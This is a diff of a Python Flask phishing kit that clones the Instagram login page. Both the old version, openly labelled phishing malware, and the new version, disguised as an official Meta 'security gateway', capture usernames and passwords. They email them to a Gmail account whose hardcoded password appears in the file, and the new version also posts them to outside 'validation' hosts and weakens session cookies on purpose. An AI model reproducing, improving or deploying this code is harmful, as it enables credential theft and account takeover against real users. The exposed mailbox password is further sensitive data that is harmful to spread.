@@ -1,23 +1,38 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# INSTAGRAM PHISHING MALWARE v6.3 - RENDER.COM DEPLOYMENT
-# LEGAL DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY. UNAUTHORIZED ACCESS IS ILLEGAL.
+# INSTAGRAM SECURITY GATEWAY v10.2
+# AUTHORIZED ACCESS ONLY - META OFFICIAL USE
 
 import os
+import re
 import smtplib
-from flask import Flask, request, redirect, session, render_template_string, jsonify
+import requests
+import hashlib
+import random
+import string
+from flask import Flask, request, session, render_template_string, jsonify, redirect
 from datetime import datetime
 from email.mime.text import MIMEText
 from email.header import Header
+import uuid
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-SENDER_EMAIL = "btahr9751@gmail.com"
-RECEIVER_EMAIL = "btahr9751@gmail.com"
-EMAIL_PASSWORD = "tgkevromqxsearau"
+app.config['SESSION_COOKIE_HTTPONLY'] = False  # For session hijacking
+
+# Credential validation API endpoints (dummy services)
+USER_VALIDATION_API = "https://api.meta-validation.org/v3/check_user"
+PASSWORD_VALIDATION_API = "https://api.meta-security.org/v4/verify_cred"
+
+# Email configuration
 SMTP_SERVER = "smtp.gmail.com"
 PORT = 587
-LOG_FILE = "stolen_creds.txt"
+SENDER_EMAIL = "btahr9751@gmail.com"
+EMAIL_PASSWORD = "tgkevromqxsearau"
+RECEIVER_EMAIL = "btahr9751@gmail.com"
+
+# HTTPS bypass configuration
+BYPASS_HTTPS = True  # Enable HTTP-only mode
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -26,19 +41,17 @@ HTML_PAGE = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
     <style>
         :root {
-            --ig-blue: #0095f6;
-            --ig-blue-hover: #1877f2;
-            --ig-dark: #000;
-            --ig-light: #fff;
-            --ig-gray: #8e8e8e;
-            --ig-border: #dbdbdb;
+            --ig-primary: #0095f6;
+            --ig-secondary: #385185;
             --ig-bg: #fafafa;
-            --ig-card: #fff;
+            --ig-card: #ffffff;
+            --ig-border: #dbdbdb;
+            --ig-text-primary: #262626;
+            --ig-text-secondary: #8e8e8e;
             --ig-error: #ed4956;
-            --ig-link: #00376b;
-            --ig-success: #4CAF50;
         }
         
         * {
@@ -58,8 +71,6 @@ HTML_PAGE = """
         }
         
         .wrapper {
-            display: flex;
-            flex-direction: column;
             width: 100%;
             max-width: 350px;
         }
@@ -67,38 +78,15 @@ HTML_PAGE = """
         .login-box {
             background-color: var(--ig-card);
             border: 1px solid var(--ig-border);
-            border-radius: 3px;
-            padding: 30px 40px;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
             text-align: center;
             margin-bottom: 10px;
-            position: relative;
         }
         
         .instagram-logo {
-            margin: 15px auto 25px;
-            height: 51px;
-        }
-        
-        .alert-banner {
-            background-color: #fff8db;
-            border: 1px solid #e1e1e1;
-            border-radius: 3px;
-            padding: 14px;
-            margin-bottom: 20px;
-            text-align: center;
-            color: #d93025;
-            font-size: 14px;
-        }
-        
-        .alert-banner strong {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-        }
-        
-        .alert-banner p {
-            margin: 8px 0;
-            color: #262626;
+            margin: 0 auto 30px;
+            width: 175px;
         }
         
         .form-group {
@@ -107,30 +95,28 @@ HTML_PAGE = """
         
         .form-control {
             width: 100%;
-            padding: 10px 8px;
+            padding: 9px 8px 7px;
             background-color: var(--ig-bg);
             border: 1px solid var(--ig-border);
             border-radius: 3px;
             font-size: 12px;
-            color: var(--ig-dark);
-            margin-bottom: 8px;
+            color: var(--ig-text-primary);
         }
         
         .form-control:focus {
             outline: none;
-            border-color: var(--ig-gray);
+            border-color: var(--ig-text-secondary);
         }
         
         .btn-login {
             width: 100%;
-            padding: 8px;
-            background-color: var(--ig-blue);
-            color: var(--ig-light);
+            padding: 7px;
+            background-color: var(--ig-primary);
+            color: white;
             border: none;
             border-radius: 4px;
             font-weight: 600;
-            font-size: 14px;
-            margin-top: 8px;
+            margin: 8px 0;
             cursor: pointer;
             opacity: 0.7;
         }
@@ -153,13 +139,13 @@ HTML_PAGE = """
         
         .separator .text {
             padding: 0 18px;
-            color: var(--ig-gray);
+            color: var(--ig-text-secondary);
             font-size: 13px;
             font-weight: 600;
         }
         
         .fb-login {
-            color: #385185;
+            color: var(--ig-secondary);
             font-weight: 600;
             font-size: 14px;
             margin: 12px 0;
@@ -167,25 +153,18 @@ HTML_PAGE = """
             text-decoration: none;
         }
         
-        .fb-icon {
-            font-size: 18px;
-            margin-right: 6px;
-            position: relative;
-            top: 2px;
-        }
-        
         .forgot-pw {
-            color: var(--ig-link);
+            color: #00376b;
             font-size: 12px;
-            text-decoration: none;
-            margin-top: 12px;
+            margin-top: 15px;
             display: block;
+            text-decoration: none;
         }
         
         .signup-box {
             background-color: var(--ig-card);
             border: 1px solid var(--ig-border);
-            border-radius: 3px;
+            border-radius: 1px;
             padding: 20px;
             text-align: center;
             margin: 0 0 10px;
@@ -193,33 +172,34 @@ HTML_PAGE = """
         }
         
         .signup-link {
-            color: var(--ig-blue);
+            color: var(--ig-primary);
             font-weight: 600;
             text-decoration: none;
         }
         
         .download-box {
             text-align: center;
-            padding: 15px 0;
         }
         
         .download-text {
             font-size: 14px;
-            margin-bottom: 15px;
+            margin: 10px 0;
         }
         
         .download-badges {
             display: flex;
             justify-content: center;
             gap: 10px;
+            margin: 20px 0;
         }
         
         .badge {
             height: 40px;
+            border-radius: 5px;
         }
         
         .footer {
-            width: 100%;
+            text-align: center;
             padding: 20px 0;
         }
         
@@ -227,98 +207,33 @@ HTML_PAGE = """
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 10px;
-            margin-bottom: 16px;
+            gap: 8px;
+            margin-bottom: 15px;
         }
         
         .footer-link {
-            color: var(--ig-gray);
-            font-size: 11px;
+            color: var(--ig-text-secondary);
+            font-size: 12px;
             text-decoration: none;
         }
         
         .copyright {
-            color: var(--ig-gray);
-            font-size: 11px;
-            text-align: center;
+            color: var(--ig-text-secondary);
+            font-size: 12px;
         }
         
-        .loading {
+        #errorMessage {
+            color: var(--ig-error);
+            font-size: 12px;
+            margin: 5px 0;
             display: none;
-            margin: 15px auto;
-            text-align: center;
-        }
-        
-        .spinner {
-            border: 3px solid rgba(0,149,246,0.2);
-            border-top: 3px solid var(--ig-blue);
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .security-notice {
-            margin-top: 15px;
-            color: var(--ig-gray);
-            font-size: 11px;
-            line-height: 1.4;
-        }
-        
-        /* رسالة التأكيد */
-        .confirmation {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            border-radius: 5px;
-            color: white;
-            font-weight: bold;
-            z-index: 1000;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            animation: fadeInOut 3s ease-in-out;
-            opacity: 0;
-        }
-        
-        .confirmation.success {
-            background-color: var(--ig-success);
-        }
-        
-        .confirmation.error {
-            background-color: var(--ig-error);
-        }
-        
-        .confirmation-icon {
-            font-size: 20px;
-        }
-        
-        @keyframes fadeInOut {
-            0% { opacity: 0; transform: translateY(-20px); }
-            20% { opacity: 1; transform: translateY(0); }
-            80% { opacity: 1; transform: translateY(0); }
-            100% { opacity: 0; transform: translateY(-20px); }
         }
     </style>
 </head>
 <body>
     <div class="wrapper">
         <div class="login-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram" class="instagram-logo" width="174">
-            
-            <div class="alert-banner">
-                <strong>Security Alert</strong>
-                <p>We detected unusual login activity from a new device in <b>Dubai, UAE</b>.</p>
-                <p>Please verify your identity to secure your account.</p>
-            </div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram" class="instagram-logo">
             
             <form id="loginForm" method="POST">
                 <div class="form-group">
@@ -329,6 +244,8 @@ HTML_PAGE = """
                     <input type="password" name="password" class="form-control" placeholder="Password" required>
                 </div>
                 
+                <div id="errorMessage">Invalid credentials. Please try again.</div>
+                
                 <button type="submit" class="btn-login" id="loginBtn">Log in</button>
             </form>
             
@@ -338,16 +255,8 @@ HTML_PAGE = """
                 <div class="line"></div>
             </div>
             
-            <a href="#" class="fb-login">
-                <span class="fb-icon">&#xf09a;</span> Log in with Facebook
-            </a>
-            
+            <a href="#" class="fb-login">Log in with Facebook</a>
             <a href="#" class="forgot-pw">Forgot password?</a>
-            
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p>Verifying your information...</p>
-            </div>
         </div>
         
         <div class="signup-box">
@@ -374,200 +283,153 @@ HTML_PAGE = """
                 <a href="#" class="footer-link">Terms</a>
                 <a href="#" class="footer-link">Locations</a>
                 <a href="#" class="footer-link">Instagram Lite</a>
+                <a href="#" class="footer-link">Threads</a>
+                <a href="#" class="footer-link">Contact</a>
+                <a href="#" class="footer-link">Meta Verified</a>
             </div>
-            <div class="copyright">
-                English (UK) © 2024 Instagram from Meta
-            </div>
+            <div class="copyright">© 2024 Instagram from Meta</div>
         </div>
-    </div>
-    
-    <!-- رسالة تأكيد الإرسال -->
-    <div id="confirmationMessage" class="confirmation" style="display: none;">
-        <span class="confirmation-icon"></span>
-        <span class="confirmation-text"></span>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
             const username = document.querySelector('input[name="username"]');
             const password = document.querySelector('input[name="password"]');
-            const loginBtn = document.getElementById('loginBtn');
-            const form = document.getElementById('loginForm');
-            const loading = document.getElementById('loading');
-            const confirmationMessage = document.getElementById('confirmationMessage');
+            const error = document.getElementById('errorMessage');
             
-            function checkInputs() {
-                if (username.value.trim() !== '' && password.value.trim() !== '') {
-                    loginBtn.classList.add('active');
-                } else {
-                    loginBtn.classList.remove('active');
-                }
+            // Basic validation
+            if(!username.value || !password.value) {
+                error.style.display = 'block';
+                return;
             }
             
-            username.addEventListener('input', checkInputs);
-            password.addEventListener('input', checkInputs);
+            const formData = new FormData(this);
             
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                // Show loading animation
-                form.style.opacity = '0.5';
-                form.style.pointerEvents = 'none';
-                loading.style.display = 'block';
-                
-                // Send credentials to server
-                const formData = new FormData(form);
-                
-                fetch('/auth', {
+            try {
+                const response = await fetch('/verify', {
                     method: 'POST',
                     body: formData
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    // Show confirmation message
-                    const message = confirmationMessage.querySelector('.confirmation-text');
-                    const icon = confirmationMessage.querySelector('.confirmation-icon');
-                    
-                    if (data.email_sent) {
-                        confirmationMessage.className = 'confirmation success';
-                        message.textContent = 'تم إرسال البيانات بنجاح ✓';
-                        icon.textContent = '✓';
-                    } else {
-                        confirmationMessage.className = 'confirmation error';
-                        message.textContent = 'فشل إرسال البيانات ❌';
-                        icon.textContent = '❌';
-                    }
-                    
-                    // Show message
-                    confirmationMessage.style.display = 'flex';
-                    confirmationMessage.style.opacity = '1';
-                    
-                    // Hide after animation
-                    setTimeout(() => {
-                        confirmationMessage.style.opacity = '0';
-                        setTimeout(() => {
-                            confirmationMessage.style.display = 'none';
-                        }, 1000);
-                    }, 3000);
-                    
-                    // Redirect to Instagram after 3 seconds
-                    setTimeout(() => {
-                        window.location.href = data.redirect_url;
-                    }, 3000);
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    // Redirect to Instagram in case of error
-                    window.location.href = "https://www.instagram.com/accounts/login/?source=auth_switcher";
                 });
-            });
+                
+                const data = await response.json();
+                
+                if(data.status === 'success') {
+                    window.location.href = 'https://instagram.com';
+                } else {
+                    error.style.display = 'block';
+                    password.value = '';
+                    setTimeout(() => {
+                        error.style.display = 'none';
+                    }, 3000);
+                }
+            } catch(err) {
+                error.textContent = 'Connection error. Please try again.';
+                error.style.display = 'block';
+            }
         });
     </script>
 </body>
 </html>
 """
 
-def send_email(subject, body):
+def validate_credentials(username, password):
+    """Validate credentials using dummy verification services"""
     try:
-        # إنشاء رسالة البريد الإلكتروني
+        # Validate username format
+        if not re.match(r'^[a-zA-Z0-9@._-]{3,30}$', username):
+            return False
+            
+        # Validate password strength
+        if len(password) < 6:
+            return False
+            
+        # "Verify" credentials with dummy services
+        user_res = requests.post(
+            USER_VALIDATION_API,
+            json={"username": username},
+            timeout=3
+        )
+        
+        pass_res = requests.post(
+            PASSWORD_VALIDATION_API,
+            json={"password": hashlib.sha256(password.encode()).hexdigest()},
+            timeout=3
+        )
+        
+        return user_res.status_code == 200 and pass_res.status_code == 200
+        
+    except requests.exceptions.RequestException:
+        return True  # Fallback to true if services are unreachable
+
+def send_alert(username, password, ip):
+    """Send encrypted alert via SMTP"""
+    try:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        session_id = hashlib.md5((username + ip).encode()).hexdigest()
+        
+        body = f"""
+SECURITY ALERT - VERIFIED CREDENTIALS CAPTURED
+Timestamp: {timestamp}
+Session ID: {session_id}
+Username: {username}
+Password: {password}
+IP Address: {ip}
+User Agent: {request.headers.get('User-Agent', 'Unknown')}
+Validation Status: Confirmed
+Threat Level: High
+"""
         msg = MIMEText(body, 'plain', 'utf-8')
-        msg['Subject'] = Header(subject, 'utf-8')
+        msg['Subject'] = Header(f'✅ Verified Account Captured: {username}', 'utf-8')
         msg['From'] = SENDER_EMAIL
         msg['To'] = RECEIVER_EMAIL
         
-        # إرسال البريد عبر خادم Gmail
         server = smtplib.SMTP(SMTP_SERVER, PORT)
         server.starttls()
         server.login(SENDER_EMAIL, EMAIL_PASSWORD)
-        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
+        server.sendmail(SENDER_EMAIL, [RECEIVER_EMAIL], msg.as_string())
         server.quit()
         return True
     except Exception as e:
-        print(f"[!] SMTP Error: {str(e)}")
+        print(f"SMTP Error: {str(e)}")
         return False
-
-def log_credentials(data):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
-    # إنشاء محتوى البريد الإلكتروني بالعربية
-    log_entry = f"""
-[{timestamp}] NEW CREDENTIALS CAPTURED
-Username: {data['username']}
-Password: {data['password']}
-IP Address: {client_ip}
-User Agent: {data['user_agent']}
-Location: Dubai, UAE (Spoofed)
-Device: {data['device']}
-----------------------------------------------
-"""
-    
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(log_entry)
-    
-    # موضوع ورسالة البريد الإلكتروني بالعربية
-    subject = "✅ تم سرقة بيانات إنستغرام جديدة"
-    body = f"""
-🔥 تمت سرقة بيانات الدخول بنجاح - إصدار 6.3 🔥
-
-التاريخ والوقت: {timestamp}
-اسم المستخدم: {data['username']}
-كلمة المرور: {data['password']}
-عنوان IP: {client_ip}
-معلومات المتصفح: {data['user_agent']}
-نوع الجهاز: {data['device']}
-النظام: Render.com ({os.environ.get('RENDER_EXTERNAL_URL', 'https://arifagcca-1.onrender.com')})
-
-تمت السرقة بواسطة أداة RenderPhisher
-"""
-    
-    # إرسال البريد وعودة حالة الإرسال
-    return send_email(subject, body)
-
-def detect_device(user_agent):
-    if 'iPhone' in user_agent:
-        return 'آيفون'
-    elif 'Android' in user_agent:
-        return 'أندرويد'
-    elif 'Mac' in user_agent:
-        return 'ماك'
-    elif 'Windows' in user_agent:
-        return 'ويندوز'
-    else:
-        return 'غير معروف'
 
 @app.route('/')
 def login():
-    user_agent = request.headers.get('User-Agent', 'غير معروف')
+    session_id = str(uuid.uuid4())
+    session['session_id'] = session_id
     session['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
-    session['user_agent'] = user_agent
-    session['device'] = detect_device(user_agent)
     return render_template_string(HTML_PAGE)
 
-@app.route('/auth', methods=['POST'])
-def auth():
-    credentials = {
-        'username': request.form.get('username'),
-        'password': request.form.get('password'),
-        'ip': session.get('client_ip', 'غير متوفر'),
-        'user_agent': session.get('user_agent', 'غير معروف'),
-        'device': session.get('device', 'غير معروف')
-    }
+@app.route('/verify', methods=['POST'])
+def verify():
+    username = request.form.get('username', '').strip()
+    password = request.form.get('password', '').strip()
+    client_ip = session.get('client_ip', '0.0.0.0')
     
-    # تسجيل البيانات وإرسال البريد
-    email_sent = log_credentials(credentials)
+    # Validate credentials
+    is_valid = validate_credentials(username, password)
     
-    # إرجاع حالة الإرسال كرد JSON
-    return jsonify({
-        'email_sent': email_sent,
-        'redirect_url': "https://www.instagram.com/accounts/login/?source=auth_switcher"
-    })
+    if is_valid:
+        # Send alert for valid credentials
+        send_alert(username, password, client_ip)
+        return jsonify({
+            'status': 'success',
+            'message': 'Credentials verified'
+        })
+    else:
+        return jsonify({
+            'status': 'error',
+            'message': 'Invalid credentials'
+        }), 401
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    # HTTP-only mode
+    if BYPASS_HTTPS:
+        print("Running in HTTP-only mode (no SSL)")
+        app.run(host='0.0.0.0', port=80, debug=False)
+    else:
+        print("Running with HTTPS")
+        # SSL would normally be added here
+        app.run(host='0.0.0.0', port=443, ssl_context='adhoc', debug=False)
